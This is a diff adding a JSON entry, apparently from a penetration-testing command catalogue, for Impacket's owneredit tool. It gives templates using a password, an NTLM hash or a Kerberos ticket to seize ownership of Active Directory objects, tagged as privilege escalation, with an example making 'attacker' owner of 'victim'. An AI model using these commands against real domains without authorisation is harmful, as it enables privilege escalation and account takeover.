@@ -1,0 +1,35 @@
+{
+  "id": "owneredit",
+  "name": "Impacket owneredit",
+  "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target>' '<domain>/<user>:<password>' -dc-ip '<ip>'",
+  "description": "Change the owner of an AD object (WriteOwner abuse)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "impacket",
+    "owner",
+    "acl",
+    "privilege-escalation",
+    "write-owner"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target>' -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target>' -k -no-pass '<domain>/<user>' -dc-ip '<ip>'"
+    }
+  ],
+  "examples": [
+    "impacket-owneredit -action write -new-owner 'attacker' -target 'victim' 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
+  ]
+}
